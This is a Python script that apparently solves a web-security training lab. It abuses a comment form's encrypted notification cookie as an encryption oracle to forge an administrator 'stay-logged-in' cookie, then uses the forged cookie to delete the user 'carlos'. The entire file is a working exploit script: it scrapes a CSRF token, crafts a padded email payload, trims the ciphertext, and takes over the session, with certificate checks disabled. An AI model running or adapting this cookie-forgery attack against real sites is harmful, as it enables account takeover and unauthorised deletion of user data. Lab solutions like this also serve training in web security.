#!/usr/bin/env python3
from bs4 import BeautifulSoup
import base64
import requests
import sys
import time
import urllib
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if len(sys.argv) != 2:
    print("Usage: python3 script.py <url>")
    sys.exit(1)

burp_url = sys.argv[1].strip().rstrip('/')
post_url = burp_url + '/post'
admin_delete_url = burp_url + '/admin/delete'
client = requests.Session()
client.verify = False

if client.get(burp_url).status_code == 504:
    sys.exit(-2)

r = client.get(burp_url)
soup = BeautifulSoup(r.text, 'html.parser')
post_id = None
try:
    post_id = soup.find('div', attrs={'class': 'blog-post'}).find_next('a').get('href').split('=')[1]
except (TypeError, AttributeError):
    sys.exit(-3)

r = client.get(f'{post_url}?postId={post_id}')
csrf_token = BeautifulSoup(r.text, 'html.parser').find('input', attrs={'name': 'csrf'})['value']
data = {
    'csrf': csrf_token,
    'postId': post_id,
    'comment': 'mycomment',
    'name': 'myname',
    'email': 'x' * 9 + f'administrator:{time.time()}',
    'website': ''
}

client.post(f'{post_url}/comment', data=data, allow_redirects=False)
encrypted_string = client.cookies.get('notification')

if not encrypted_string:
    sys.exit(-4)

b = base64.b64decode(urllib.parse.unquote(encrypted_string))
stay_logged_in_cookie = urllib.parse.quote(base64.b64encode(b[32:]))

if not stay_logged_in_cookie:
    sys.exit(-5)

client.cookies.clear()
client.cookies.set('stay-logged-in', stay_logged_in_cookie, domain=burp_url[8:])
if client.get(f'{admin_delete_url}?username=carlos', allow_redirects=False).status_code != 302:
    sys.exit(-6)

time.sleep(2)
if 'Congratulations, you solved the lab!' not in client.get(burp_url).text:
    sys.exit(-9)
